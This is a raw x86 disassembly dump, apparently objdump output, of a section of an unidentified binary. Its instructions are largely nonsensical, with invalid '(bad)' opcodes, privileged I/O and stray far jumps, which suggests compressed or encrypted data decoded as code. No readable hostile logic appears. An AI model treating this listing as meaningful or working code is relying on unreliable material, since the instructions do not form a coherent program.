  41a4fc:	out    dx,al
  41a4fd:	mov    edi,0x235ce9b5
  41a502:	out    0xa1,eax
  41a504:	jbe    0x41a516
  41a506:	cmp    DWORD PTR [edi],ecx
  41a508:	cmc    
  41a509:	add    ch,ch
  41a50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a50c:	xchg   esp,eax
  41a50d:	dec    eax
  41a50e:	add    DWORD PTR [ebx],ebx
  41a510:	lock aaa 
  41a512:	xor    al,0xad
  41a514:	(bad)  
  41a515:	sahf   
  41a516:	jno    0x41a541
  41a518:	pop    esp
  41a519:	or     DWORD PTR [esi+0x48f93951],edx
  41a51f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a520:	clc    
  41a521:	pop    ds
  41a522:	inc    edi
  41a523:	push   es
  41a524:	test   DWORD PTR [eax],edx
  41a526:	push   esi
  41a527:	cld    
  41a528:	and    eax,0x61c5ff4e
  41a52d:	test   BYTE PTR [ecx],0x39
  41a530:	cld    
  41a531:	loopne 0x41a4f5
  41a533:	jg     0x41a532
  41a535:	jne    0x41a4c3
  41a537:	call   0xb451e9d2
  41a53c:	xchg   ecx,eax
  41a53d:	inc    esp
  41a53e:	int    0x7f
  41a540:	shl    DWORD PTR [ebx+0x795ba703],cl
  41a546:	and    dl,bl
  41a548:	adc    DWORD PTR [esi+0x74909130],esp
  41a54e:	(bad)  
  41a54f:	in     al,dx
  41a550:	xchg   esp,eax
  41a551:	shrd   DWORD PTR [ebp-0x6c],ebx,0x13
  41a556:	icebp  
  41a557:	and    esi,ecx
  41a559:	inc    esp
  41a55a:	aam    0xe3
  41a55c:	js     0x41a5b1
  41a55e:	mov    WORD PTR [ecx],fs
  41a560:	hlt    
  41a561:	add    ah,ah
  41a563:	cmp    eax,0x643b58c
  41a569:	inc    esi
  41a56a:	daa    
  41a56b:	mov    DWORD PTR [ebx],edx
  41a56d:	cli    
  41a56e:	xchg   edi,eax
  41a56f:	lods   al,BYTE PTR ds:[esi]
  41a570:	xchg   ebp,eax
  41a571:	xchg   BYTE PTR ds:0xbc7ef2c0,bh
  41a577:	imul   ebp,DWORD PTR [ebx+esi*1],0x6f328714
  41a57e:	push   0xad3ecf0d
  41a583:	bound  eax,QWORD PTR ds:0x48bc72be
  41a589:	(bad)  
  41a58a:	iret   
  41a58b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a58c:	lods   al,BYTE PTR ds:[esi]
  41a58d:	inc    ebx
  41a58e:	fstp   DWORD PTR [edx+0x7f20c9ef]
  41a594:	sub    BYTE PTR [edx+0x7f],bl
  41a597:	mov    al,ds:0xad92b4a4
  41a59c:	push   ss
  41a59d:	call   FWORD PTR [ebx+eax*4+0x32d9790]
  41a5a4:	test   eax,0x8e6c1242
  41a5a9:	fimul  DWORD PTR [edi-0x73]
  41a5ac:	pop    ecx
  41a5ad:	test   bl,0x55
  41a5b0:	dec    ebp
  41a5b1:	mov    edi,0xd2fea6fb
  41a5b6:	or     BYTE PTR [ebp-0x64],ch
  41a5b9:	xor    DWORD PTR [ebx],ecx
  41a5bb:	add    DWORD PTR [edi*4-0x271e8205],ebp
  41a5c2:	mov    ah,0xed
  41a5c4:	mov    cs:0xc459badc,al
  41a5ca:	sub    ebx,DWORD PTR [edi]
  41a5cc:	xor    al,0x42
  41a5ce:	(bad)  
  41a5d0:	popa   
  41a5d1:	ret    0x48ba
  41a5d4:	add    eax,ebx
  41a5d6:	inc    ebp
  41a5d7:	sub    DWORD PTR [ebx+0x48],0xfe9086f1
  41a5de:	mov    dl,0x87
  41a5e0:	dec    esi
  41a5e1:	pop    esi
  41a5e2:	mov    edi,0xd06f6c0
  41a5e7:	pop    es
  41a5e8:	ins    DWORD PTR es:[edi],dx
  41a5e9:	pop    ecx
  41a5ea:	mov    ecx,0x866bff61
  41a5ef:	mov    eax,ds:0xc8e24f97
  41a5f4:	push   esi
  41a5f5:	test   al,0xb5
  41a5f7:	adc    eax,0x70aee063
  41a5fc:	push   edx
  41a5fd:	cmp    ebp,edx
  41a5ff:	lods   eax,DWORD PTR ds:[esi]
  41a600:	cmp    BYTE PTR [ebx],dl
  41a602:	sar    DWORD PTR [ecx+0x0],0x0
	...
  41a60e:	add    BYTE PTR [eax],al
  41a610:	add    ah,dl
  41a612:	mov    edi,0xedff8dd6
  41a617:	(bad)  
  41a619:	or     al,0x14
  41a61b:	call   0xbb79:0x32f2294e
  41a622:	and    eax,DWORD PTR [ecx]
  41a624:	add    BYTE PTR [ebx+0x2d000003],ch
  41a62a:	or     edx,edx
  41a62c:	fs push es
  41a62e:	inc    ebp
  41a62f:	fmulp  st(3),st
  41a631:	pop    esp
  41a632:	mov    al,0x61
  41a634:	les    edx,FWORD PTR [edi+ecx*4]
  41a637:	(bad)  
  41a638:	das    
  41a639:	call   FWORD PTR [ecx+0x18]
  41a63c:	mov    ecx,ebx
  41a63e:	mov    dh,dh
  41a640:	pop    es
  41a641:	in     eax,dx
  41a642:	cmp    edi,DWORD PTR [eax+edi*1-0x1d]
  41a646:	and    BYTE PTR [ebx+0x0],0xe6
  41a64a:	leave  
  41a64b:	ss in  eax,0x81
  41a64e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a64f:	or     dh,BYTE PTR [edi+0x3be4b667]
  41a655:	inc    ebx
  41a656:	add    eax,0xc132aff5
  41a65b:	bound  ecx,QWORD PTR [esi+0x4829fbe9]
  41a661:	stc    
  41a662:	fcmovu st,st(4)
  41a664:	bound  edi,QWORD PTR [edi+0x3425110c]
  41a66a:	cs inc ebp
  41a66c:	lods   al,BYTE PTR ds:[esi]
  41a66d:	enter  0x9388,0x59
  41a671:	sti    
  41a672:	or     edx,DWORD PTR [eax-0x6f]
  41a675:	test   DWORD PTR [esi+0x24736009],0x80947d1e
  41a67f:	mov    cs,WORD PTR [ebx+esi*2]
  41a682:	fidiv  DWORD PTR [eax+0x76]
  41a685:	pop    ds
  41a686:	mov    ecx,0xfc80fc9b
  41a68b:	aaa    
  41a68c:	inc    ebp
  41a68d:	sti    
  41a68e:	mov    ch,0xfe
  41a690:	ret    
  41a691:	cmp    al,ah
  41a693:	push   edx
  41a694:	iret   
  41a695:	loop   0x41a714
  41a697:	pop    ebp
  41a698:	pop    eax
  41a699:	sbb    esp,edi
  41a69b:	fdiv   QWORD PTR [edx+0x11]
  41a69e:	fmul   QWORD PTR [ebp+0x7708a11e]
  41a6a4:	mov    al,0x2a
  41a6a6:	rol    esp,1
  41a6a8:	int3   
  41a6a9:	movlps QWORD PTR [edi+0x40407de0],xmm7
  41a6b0:	xchg   ebx,eax
  41a6b1:	bound  ebx,QWORD PTR [edx]
  41a6b3:	pop    ebp
  41a6b4:	neg    DWORD PTR [eax-0x4d3f6aaa]
  41a6ba:	adc    bh,al
  41a6bc:	mov    dl,BYTE PTR [ebp+0x984e517]
  41a6c2:	adc    ecx,esp
  41a6c4:	or     al,0x36
  41a6c6:	pop    esi
  41a6c7:	test   eax,0x8a3867e3
  41a6cc:	add    bl,BYTE PTR ds:0x2432d162
  41a6d2:	popf   
  41a6d3:	pop    es
  41a6d4:	mov    ds:0x8e5d04cb,eax
  41a6d9:	pop    esp
  41a6da:	or     bh,BYTE PTR [esi-0x33]
  41a6dd:	test   DWORD PTR [esi+edi*1+0x51],esp
  41a6e1:	cmp    BYTE PTR [eax],dl
  41a6e3:	pusha  
  41a6e4:	adc    edx,0xffffffab
  41a6e7:	pop    ss
  41a6e8:	add    BYTE PTR [ebx+0x549fa3c6],0x94
  41a6ef:	ret    
  41a6f0:	lahf   
  41a6f1:	push   edi
  41a6f2:	pop    edx
  41a6f3:	sar    ecx,1
  41a6f5:	cmc    
  41a6f6:	jne    0x41a6c1
  41a6f8:	xlat   BYTE PTR ds:[ebx]
  41a6f9:	enter  0x2551,0x98
  41a6fd:	jae    0x41a6e0
  41a6ff:	icebp  
  41a700:	push   cs
  41a701:	gs hlt 
  41a703:	mov    ds,WORD PTR ds:0xb88dfa24
  41a709:	and    BYTE PTR gs:[edx+0x20],cl
  41a70d:	das    
  41a70e:	cli    
  41a70f:	hlt    
  41a710:	xor    eax,DWORD PTR [ebx-0x7d]
  41a713:	jp     0x41a6db
  41a715:	aaa    
  41a716:	jb     0x41a795
  41a718:	mov    edi,0x8734109
  41a71d:	push   eax
  41a71e:	test   al,0x7
  41a720:	fbld   TBYTE PTR [edx+edi*1+0x5df7420d]
  41a727:	ror    bh,0xf0
  41a72a:	cmc    
  41a72b:	push   ebp
  41a72c:	fisub  DWORD PTR [ebx]
  41a72e:	popa   
  41a72f:	repnz xor ebp,esp
  41a732:	or     eax,0x61448636
  41a737:	inc    eax
  41a738:	ja     0x41a6db
  41a73a:	hlt    
  41a73b:	xor    esp,eax
  41a73d:	and    eax,0x520a0b8c
  41a742:	inc    edx
  41a743:	xchg   DWORD PTR [esi+0x5f],ebp
  41a746:	cmp    BYTE PTR [ecx+0x656dd9b0],0xfc
  41a74d:	push   ebp
  41a74e:	lock sub al,0x8d
  41a751:	jp     0x41a716
  41a753:	or     al,0x5a
  41a755:	stc    
  41a756:	arpl   WORD PTR [ebp-0x22],sp
  41a759:	inc    esi
  41a75a:	js     0x41a7da
  41a75c:	inc    ebx
  41a75d:	jmp    0xeb9f:0x41e4b67e
  41a764:	cs hlt 
  41a766:	jns    0x41a7c6
  41a768:	xchg   esi,eax
  41a769:	dec    esp
  41a76a:	cmp    BYTE PTR [edi],0x18
  41a76d:	xor    eax,0x3557efde
  41a772:	mov    eax,0x6ebff832
  41a777:	push   eax
  41a778:	cmp    BYTE PTR [edx],al
  41a77a:	fdivr  st(0),st
  41a77c:	xlat   BYTE PTR ds:[ebx]
  41a77d:	jbe    0x41a72a
  41a77f:	xor    BYTE PTR [eax],0x0
  41a782:	rcl    BYTE PTR [ecx+ebx*2-0x42],cl
  41a786:	push   ebx
  41a787:	and    esi,edx
  41a789:	sub    edx,DWORD PTR [eax-0x505dae0d]
  41a78f:	(bad)  
  41a790:	adc    edx,DWORD PTR ds:0x4de9e8b1
  41a796:	pop    ebx
  41a797:	mov    ch,0x23
  41a799:	push   ds
  41a79a:	push   es
  41a79b:	ja     0x41a802
  41a79d:	pop    ebp
  41a79e:	inc    edi
  41a79f:	pop    eax
  41a7a0:	repnz mov ah,0xfe
  41a7a3:	sub    BYTE PTR gs:[eax],cl
  41a7a6:	jg     0x41a7a6
  41a7a8:	cmp    eax,0x34c8367e
  41a7ad:	and    dh,bh
  41a7af:	push   edi
  41a7b0:	cmc    
  41a7b1:	mov    ds:0x95cd7783,al
  41a7b6:	ja     0x41a7c4
  41a7b8:	xchg   ecx,eax
  41a7b9:	jbe    0x41a7cb
  41a7bb:	or     al,0x76
  41a7bd:	div    BYTE PTR [eax]
  41a7bf:	jg     0x41a826
  41a7c1:	outs   dx,BYTE PTR ds:[esi]
  41a7c2:	int    0x5f
  41a7c4:	dec    edx
  41a7c5:	adc    DWORD PTR [ebx+ebx*2-0x32882ca1],ebx
  41a7cc:	mov    cl,0x82
  41a7ce:	aad    0xef
  41a7d0:	fwait
  41a7d1:	cmp    DWORD PTR [edx+0x69],ebp
  41a7d4:	ret    0xf6e0
  41a7d7:	cmp    dl,BYTE PTR [esi]
  41a7d9:	icebp  
  41a7da:	mov    ds:0x3e18fcfb,eax
  41a7df:	jb     0x41a7ac
  41a7e1:	and    esp,esi
  41a7e3:	pusha  
  41a7e4:	xchg   edi,eax
  41a7e5:	xchg   ebx,eax
  41a7e6:	jecxz  0x41a7c1
  41a7e8:	xor    DWORD PTR [ebp+0x16baa808],eax
  41a7ee:	sbb    edi,ecx
  41a7f0:	arpl   WORD PTR [eax+0x5dc44e8c],dx
  41a7f6:	sub    BYTE PTR [edx+0x4e],ch
  41a7f9:	nop
  41a7fa:	fnstenv [esi-0x42]
  41a7fd:	sub    BYTE PTR [edx-0x38],ch
  41a800:	clc    
  41a801:	sub    esi,0xea09def9
  41a807:	rcl    DWORD PTR [ebx+0x4dd8c92d],1
  41a80d:	cmp    al,0x36
  41a80f:	dec    eax
  41a810:	push   ds
  41a811:	or     ah,BYTE PTR [ecx-0x39]
  41a814:	mov    edi,0x279e38b1
  41a819:	inc    BYTE PTR [edx-0x3a7f8ba8]
  41a81f:	imul   esp,DWORD PTR [esi],0x42
  41a822:	sub    eax,0x8061d22f
  41a827:	std    
  41a828:	mov    ds:0xab17bf9d,al
  41a82d:	push   cs
  41a82e:	mov    eax,ds:0xeb8c1d48
  41a833:	loope  0x41a7e3
  41a835:	mov    eax,0xdd09f35e
  41a83a:	out    dx,al
  41a83b:	daa    
  41a83c:	inc    eax
  41a83d:	jnp    0x41a8bb
  41a83f:	lods   al,BYTE PTR ds:[esi]
  41a840:	dec    ebx
  41a841:	nop
  41a842:	cmp    edx,DWORD PTR [ebx+0x1f]
  41a845:	arpl   WORD PTR [eax],bp
  41a847:	int3   
  41a848:	rcl    BYTE PTR ds:0x6cc2b1cc,0xc7
  41a84f:	xor    esp,DWORD PTR [esi]
  41a851:	pop    esi
  41a852:	mov    ecx,0xdaf8bda4
  41a857:	xor    BYTE PTR [ecx+0x8],cl
  41a85a:	div    BYTE PTR [eax+0x77]
  41a85d:	fwait
  41a85e:	pop    edx
  41a85f:	mov    ebp,edx
  41a861:	push   es
  41a862:	pusha  
  41a863:	mov    bl,0x4d
  41a865:	aaa    
  41a866:	mov    ecx,0xdf325848
  41a86b:	jg     0x41a899
  41a86d:	xor    eax,0x4fd21383
  41a872:	lds    ebp,FWORD PTR [ebp+0x79cedc76]
  41a878:	(bad)  [ecx+0x15]
  41a87b:	sbb    DWORD PTR [ebp-0x9],esp
  41a87e:	lock popa 
  41a880:	sahf   
  41a881:	mov    gs,WORD PTR [eax+0x62]
  41a884:	call   0xd8736003
  41a889:	mov    ch,0xf5
  41a88b:	ins    BYTE PTR es:[edi],dx
  41a88c:	pop    ds
  41a88d:	fimul  DWORD PTR [eax]
  41a88f:	mov    bh,0xfb
  41a891:	mov    bh,0x5c
  41a893:	adc    ah,ah
  41a895:	hlt    
  41a896:	sub    BYTE PTR [ebp+0x5ae1a620],dh
  41a89c:	jne    0x41a8fe
  41a89e:	cmp    DWORD PTR [edx-0x6],ecx
  41a8a1:	xor    eax,0xace5a7c3
  41a8a6:	shl    DWORD PTR [ebp-0x67],0xad
  41a8aa:	js     0x41a901
  41a8ac:	jl     0x41a8bc
  41a8ae:	jmp    0x41a8c8
  41a8b0:	push   ds
  41a8b1:	data16 in al,0x2c
  41a8b4:	gs push edx
  41a8b6:	outs   dx,BYTE PTR ds:[esi]
  41a8b7:	adc    BYTE PTR ds:0xa8752c52,al
  41a8bd:	xor    DWORD PTR [eax+0x2dae95be],eax
  41a8c3:	cmp    DWORD PTR [edi+edx*1+0x550208a2],0x44
  41a8cb:	jle    0x41a86b
  41a8cd:	mov    ah,bl
  41a8cf:	mov    bl,0xc1
  41a8d1:	fs data16 clc 
  41a8d4:	ret    
  41a8d5:	inc    edx
  41a8d6:	ss test al,0xab
  41a8da:	ss inc eax
  41a8dc:	sub    DWORD PTR [ebx+0x66f624c9],edx
  41a8e2:	test   eax,0x7cad7e6d
  41a8e7:	push   ecx
  41a8e8:	pop    ebp
  41a8e9:	nop
  41a8ea:	or     eax,0x5d83f9b7
  41a8ef:	mov    ebp,DWORD PTR [eax+0x5c7aaf6]
  41a8f5:	test   BYTE PTR [edx+0x6913915a],dh
  41a8fb:	test   ch,al
  41a8fd:	out    0x21,eax
  41a8ff:	xchg   DWORD PTR [edi+0x4c],ebx
  41a902:	les    edi,FWORD PTR [ecx-0xd9ffdfe]
  41a908:	je     0x41a8e6
  41a90a:	nop
  41a90b:	outs   dx,DWORD PTR ds:[esi]
  41a90c:	cmp    eax,0x78540302
  41a911:	xchg   edx,eax
  41a912:	faddp  st(6),st
  41a914:	int3   
  41a915:	pop    edx
  41a916:	loopne 0x41a8b1
  41a918:	mov    esp,DWORD PTR [eax+eiz*8]
  41a91b:	pushf  
  41a91c:	cmp    eax,0xed3dac41
  41a921:	arpl   WORD PTR [edx],bx
  41a923:	jb     0x41a962
  41a925:	pop    ds
  41a926:	push   edx
  41a928:	cmc    
  41a929:	xchg   DWORD PTR [edi+0x17],esp
  41a92c:	mov    dl,ah
  41a92e:	push   0xffffffb0
  41a930:	leave  
  41a931:	mov    cl,0xc5
  41a933:	xchg   ecx,eax
  41a934:	jbe    0x41a969
  41a936:	push   esp
  41a937:	xor    bl,BYTE PTR [ebp+ebp*1+0x67]
  41a93b:	push   0xcd452f0e
  41a940:	(bad)  
  41a941:	jmp    0x9790a86b
  41a946:	fbld   TBYTE PTR [ecx+ebp*1]
  41a949:	or     DWORD PTR [eax+0x10],eax
  41a94c:	loopne 0x41a95e
  41a94e:	dec    esp
  41a94f:	push   ebx
  41a950:	fistp  WORD PTR [eax+0x38]
  41a953:	test   BYTE PTR [ebx-0x7d],dh
  41a956:	sub    al,0x89
  41a958:	aad    0xa5
  41a95a:	lds    ebx,FWORD PTR [esi+eiz*2+0x269328a3]
  41a961:	fld    TBYTE PTR [edi-0x38]
  41a964:	stos   BYTE PTR es:[edi],al
  41a965:	cmc    
  41a966:	(bad)  [ecx]
  41a968:	pop    ecx
  41a969:	dec    ecx
  41a96a:	les    esi,FWORD PTR [ebx-0x78]
  41a96d:	ret    0x622b
  41a970:	pcmpeqb mm6,mm6
  41a973:	jecxz  0x41a97f
  41a975:	xchg   BYTE PTR [ecx],dh
  41a977:	cmp    DWORD PTR [eax-0x1ec8a10c],edi
  41a97d:	enter  0xb1bd,0xf
  41a981:	push   edi
  41a982:	js     0x41a95c
  41a984:	sbb    al,0xf8
  41a986:	xchg   BYTE PTR [ecx+0x736653d4],dl
  41a98c:	(bad)  
  41a98d:	lds    ebp,FWORD PTR [ebx+0x42]
  41a990:	cmp    ebp,edi
  41a992:	outs   dx,BYTE PTR ds:[esi]
  41a993:	sar    DWORD PTR [edi+0x67806504],1
  41a999:	and    bh,BYTE PTR [ebx-0x530777c4]
  41a99f:	pop    es
  41a9a0:	pop    ebx
  41a9a1:	sbb    eax,0xa48ff856
  41a9a6:	bound  ebx,QWORD PTR [ebx-0x4c]
  41a9a9:	pop    esi
  41a9aa:	mov    al,0xae
  41a9ac:	sbb    ch,BYTE PTR [ebx-0x2a008a16]
  41a9b2:	cmc    
  41a9b3:	test   eax,0xe9bc4767
  41a9b8:	jg     0x41a9d0
  41a9ba:	push   ss
  41a9bb:	bound  edi,QWORD PTR [edi+0x333dd342]
  41a9c1:	jmp    FWORD PTR [esi]
  41a9c3:	ja     0x41a96f
  41a9c5:	dec    ebx
  41a9c6:	jo     0x41a95b
  41a9c8:	outs   dx,BYTE PTR ds:[esi]
  41a9c9:	lods   al,BYTE PTR ds:[esi]
  41a9ca:	xchg   BYTE PTR [edi+eiz*2+0x3b],bh
  41a9ce:	dec    edx
  41a9cf:	(bad)  
  41a9d1:	lock loope 0x41a9d1
	...
  41a9e0:	add    BYTE PTR [ebx-0x8],al
  41a9e3:	gs sbb edi,edi
  41a9e6:	popf   
  41a9e7:	jg     0x41a9e3
  41a9e9:	mov    al,0x88
  41a9eb:	dec    ebp
  41a9ec:	sahf   
  41a9ed:	adc    edi,DWORD PTR [ebp-0x44]
  41a9f0:	pcmpgtd mm4,QWORD PTR [edi]
  41a9f3:	add    DWORD PTR [eax],eax
  41a9f5:	stos   DWORD PTR es:[edi],eax
  41a9f6:	add    eax,DWORD PTR [eax]
  41a9f8:	add    BYTE PTR [ecx+edi*4+0x62],ch
  41a9fc:	xchg   ebx,eax
  41a9fd:	loope  0x41a9f8
  41a9ff:	xchg   DWORD PTR [eax],eax
  41aa01:	sub    ah,dl
  41aa03:	pop    ebp
  41aa04:	push   eax
  41aa05:	push   esi
  41aa06:	popa   
  41aa07:	and    edx,esp
  41aa09:	cmc    
  41aa0a:	sbb    al,0x5b
  41aa0c:	pop    ds
  41aa0d:	mov    ecx,0x2b3830cb
  41aa12:	pop    esp
  41aa13:	in     eax,0xd8
  41aa15:	push   cs
  41aa16:	aaa    
  41aa17:	leave  
  41aa18:	loop   0x41aa64
  41aa1a:	mov    ecx,0x23edce7b
  41aa1f:	retf   0xcc21
  41aa22:	out    0x7c,eax
  41aa24:	popa   
  41aa25:	jmp    0xa8a8:0xfba22e42
  41aa2c:	jecxz  0x41aa2a
  41aa2e:	adc    DWORD PTR [eax-0x73],edi
  41aa31:	loopne 0x41aaac
  41aa33:	(bad)  
  41aa34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa35:	scas   al,BYTE PTR es:[edi]
  41aa36:	xor    BYTE PTR [ebp+eax*4-0x24],ah
  41aa3a:	xor    al,0xc4
  41aa3c:	es sub eax,0xe6909858
  41aa42:	gs loopne 0x41aa3b
  41aa45:	cmc    
  41aa46:	jnp    0x41a9d6
  41aa48:	push   edi
  41aa49:	adc    al,0xa0
  41aa4b:	add    cl,BYTE PTR [ebx+0x44]
  41aa4e:	lock xchg dh,dl
  41aa51:	test   al,0x61
  41aa53:	lock xor eax,0x52d02ed6
  41aa59:	mov    WORD PTR [ebp-0x10],es
  41aa5c:	icebp  
  41aa5d:	icebp  
  41aa5e:	fwait
  41aa5f:	pusha  
  41aa60:	add    al,0x0
  41aa62:	or     BYTE PTR [ebx+0x91c5f77],al
  41aa68:	stos   BYTE PTR es:[edi],al
  41aa69:	mov    al,0x7e
  41aa6b:	lock push esp
  41aa6d:	dec    edx
  41aa6e:	les    esp,FWORD PTR [ebp+0x7a3e73e8]
  41aa74:	ror    DWORD PTR [ebx+0x2f],1
  41aa77:	adc    eax,ecx
  41aa79:	mov    ah,0x55
  41aa7b:	xchg   edx,esp
  41aa7d:	adc    ecx,ebx
  41aa7f:	stc    
  41aa80:	push   esp
  41aa81:	jl     0x41aa67
  41aa83:	ret    0x97bf
  41aa86:	imul   esi,ebp,0xffffff99
  41aa89:	rcr    BYTE PTR [eax],1
  41aa8b:	test   DWORD PTR [ebx+0x11],ebp
  41aa8e:	retf   
  41aa8f:	jle    0x41aaac
  41aa91:	out    0xf7,eax
  41aa93:	out    0x77,al
  41aa95:	pop    ds
  41aa96:	imul   ecx,DWORD PTR [ecx+0x29],0x2e33aba1
  41aa9d:	imul   ebp,DWORD PTR [edx-0x7431ce42],0x62
  41aaa4:	push   edi
  41aaa5:	mov    ecx,0xe5f5bc6b
  41aaaa:	and    al,0x96
  41aaac:	icebp  
  41aaad:	pushf  
  41aaae:	loope  0x41aae7
  41aab0:	mov    esi,0x20c68c97
  41aab5:	mov    cl,0x23
  41aab7:	test   DWORD PTR [esi+0x5b5ea551],0xc0fa4840
  41aac1:	dec    edi
  41aac2:	lods   al,BYTE PTR ds:[esi]
  41aac3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aac4:	sar    BYTE PTR [ebp+edx*8-0x372d161],cl
  41aacb:	ins    DWORD PTR es:[edi],dx
  41aacc:	gs sub eax,0x7676519c
  41aad2:	rol    ebp,0xd0
  41aad5:	ret    0xf218
  41aad8:	sub    ecx,eax
  41aada:	test   eax,0x44805516
  41aadf:	or     esi,DWORD PTR [ecx-0x759b6457]
  41aae5:	adc    dl,BYTE PTR [eax+0x2d3379e9]
  41aaeb:	ins    DWORD PTR es:[edi],dx
  41aaec:	jo     0x41ab4d
  41aaee:	retf   
  41aaef:	or     BYTE PTR [esi+0x1eee41a4],bh
  41aaf5:	add    al,0xb0
  41aaf7:	aam    0x49
  41aaf9:	jmp    0x28d:0x8c9b7463
  41ab00:	dec    ebx
  41ab01:	xor    DWORD PTR [eax],esp
  41ab03:	cmc    
  41ab04:	jne    0x41ab69
  41ab06:	jl     0x41aa99
  41ab08:	rcr    DWORD PTR [eax+0x193a5865],1
  41ab0e:	mov    ch,0x95
  41ab10:	push   esi
  41ab11:	mov    edi,0x1a5e4fc9
  41ab16:	lods   eax,DWORD PTR ds:[esi]
  41ab17:	call   0xa1935e03
  41ab1c:	dec    esp
  41ab1d:	dec    edi
  41ab1e:	daa    
  41ab1f:	or     al,0x3e
  41ab22:	outs   dx,BYTE PTR ds:[esi]
  41ab23:	pmuludq mm6,mm1
  41ab26:	xor    dh,BYTE PTR [ecx]
  41ab28:	sbb    ah,ch
  41ab2a:	mov    dh,0x23
  41ab2c:	lahf   
  41ab2d:	pop    edi
  41ab2e:	push   0xe3d664a1
  41ab33:	mov    bh,0x4c
  41ab35:	add    al,0xb6
  41ab37:	sar    DWORD PTR [esi-0x2ded87f6],cl
  41ab3d:	push   ecx
  41ab3e:	jp     0x41ab74
  41ab40:	scas   eax,DWORD PTR es:[edi]
  41ab41:	in     eax,0x5a
  41ab43:	es cdq 
  41ab45:	(bad)
  41ab48:	shr    DWORD PTR [eax+edx*4+0x6b],cl
  41ab4c:	out    dx,eax
  41ab4d:	jge    0x41ab77
  41ab4f:	leave  
  41ab50:	jmp    0xa508b9ce
  41ab55:	push   es
  41ab56:	in     eax,0x56
  41ab58:	jno    0x41ab35
  41ab5a:	mov    ebx,0x557fd882
  41ab5f:	and    al,0x1a
  41ab61:	sbb    al,0x52
  41ab63:	ds jl  0x41ab2f
  41ab66:	or     DWORD PTR [eax+0x31],ebx
  41ab69:	cwde   
  41ab6a:	lods   al,BYTE PTR ds:[esi]
  41ab6b:	adc    ebp,DWORD PTR [esi+0x23e69db]
  41ab71:	cdq    
  41ab72:	imul   ebp,DWORD PTR [esi-0x4b],0x39f2df82
  41ab79:	sub    edi,DWORD PTR [ebx+ebp*8]
  41ab7c:	inc    esp
  41ab7d:	rcl    BYTE PTR [ebp+0x1197ebc7],0x80
  41ab84:	sbb    eax,0x33bda80d
  41ab89:	pop    edx
  41ab8a:	repz jmp 0x41abd0
  41ab8d:	inc    ecx
  41ab8e:	daa    
  41ab8f:	leave  
  41ab90:	mov    cs,WORD PTR [edi+ebp*2-0x68]
  41ab94:	jbe    0x41ab28
  41ab96:	push   0x7ea93798
  41ab9b:	scas   al,BYTE PTR es:[edi]
  41ab9c:	adc    eax,0x60ee507f
  41aba1:	ret    
  41aba2:	or     bh,ah
  41aba4:	out    dx,eax
  41aba5:	xor    eax,0xb05d779c
  41abaa:	stos   DWORD PTR es:[edi],eax
  41abab:	mov    edx,0x984c6db1
  41abb0:	and    ch,cl
  41abb2:	inc    edi
  41abb3:	data16 jne 0x41ac0b
  41abb6:	popf   
  41abb7:	mov    al,0xe4
  41abb9:	loope  0x41abc2
  41abbb:	ins    DWORD PTR es:[edi],dx
  41abbc:	daa    
  41abbd:	sub    WORD PTR [esi+0x2],0x7f36
  41abc3:	fldcw  WORD PTR [edi]
  41abc5:	pop    esi
  41abc6:	adc    ebx,esi
  41abc8:	lahf   
  41abc9:	retf   0xb1e6
  41abcc:	jecxz  0x41ac20
  41abce:	mov    edi,0x2818fea9
  41abd3:	pop    ds
  41abd4:	sar    DWORD PTR [edi],1
  41abd6:	scas   al,BYTE PTR es:[edi]
  41abd7:	xchg   BYTE PTR [ecx],bl
  41abd9:	cmp    ecx,DWORD PTR [edx-0x64]
  41abdc:	es push ecx
  41abde:	xchg   edx,eax
  41abdf:	xchg   esp,eax
  41abe0:	mov    ch,0x95
  41abe2:	xchg   edx,ecx
  41abe4:	dec    esp
  41abe5:	pop    ds
  41abe6:	sbb    DWORD PTR [ecx],ebp
  41abe8:	jle    0x41ac25
  41abea:	std    
  41abeb:	test   al,0x59
  41abed:	cmp    DWORD PTR [esi*4-0x25d75bff],0xc362131d
  41abf8:	sbb    eax,0x5ad8818d
  41abfd:	xchg   esi,ebx
  41abff:	mov    edx,0x4787b8c8
  41ac04:	and    ebx,DWORD PTR [eax-0x4034c956]
  41ac0a:	lock jp 0x41ac43
  41ac0d:	sti    
  41ac0e:	push   eax
  41ac0f:	mov    ebx,0xa742f25b
  41ac14:	jne    0x41ac32
  41ac16:	add    cl,BYTE PTR [edx+0x4c]
  41ac19:	mov    eax,0xe035867b
  41ac1e:	mov    ebp,0x50882819
  41ac23:	in     al,0xaf
  41ac25:	das    
  41ac26:	int3   
  41ac27:	loop   0x41abc1
  41ac29:	data16 mov al,ds:0xfbcabe9
  41ac2f:	cmp    DWORD PTR [ecx-0x3368eea4],0x4f3ad26d
  41ac39:	jmp    0x41ac5d
  41ac3b:	mov    ebp,esi
  41ac3d:	out    dx,eax
  41ac3e:	imul   edx,DWORD PTR [ecx+0x275bc28],0x9d8ce44e
  41ac48:	xor    ebx,DWORD PTR cs:0x92415857
  41ac4f:	jl     0x41aca8
  41ac51:	or     bl,dh
  41ac53:	xor    BYTE PTR [ecx+eax*4-0x67],0x46
  41ac58:	lods   eax,DWORD PTR ds:[esi]
  41ac59:	call   0x500f:0x44735ecd
  41ac60:	jbe    0x41acda
  41ac62:	jmp    0xc0b2:0xd2053602
  41ac69:	mov    bh,0xa0
  41ac6b:	or     eax,0x15969662
  41ac70:	rcl    BYTE PTR [ecx+0x45],1
  41ac73:	jmp    0x8d15:0x26d34171
  41ac7a:	push   ds
  41ac7b:	loope  0x41accf
  41ac7d:	cli    
  41ac7e:	mov    edi,0xda8c6dbe
  41ac83:	das    
  41ac84:	test   BYTE PTR [edi-0x672ae016],ah
  41ac8a:	mov    ebx,ds
  41ac8c:	pusha  
  41ac8d:	test   eax,0xfed7e95c
  41ac92:	and    eax,0xf831cd4d
  41ac97:	inc    esi
  41ac98:	(bad)  
  41ac99:	test   al,0x11
  41ac9c:	xchg   edx,eax
  41ac9d:	out    dx,eax
  41ac9e:	rol    DWORD PTR [eax+0x25bcbabb],cl
  41aca4:	push   edx
  41aca5:	sub    eax,0xfdf70588
  41acaa:	sub    al,0x85
  41acac:	mov    gs,WORD PTR [edi+0x4807f273]
  41acb2:	int    0x14
  41acb4:	mov    edx,0x40f7bc16
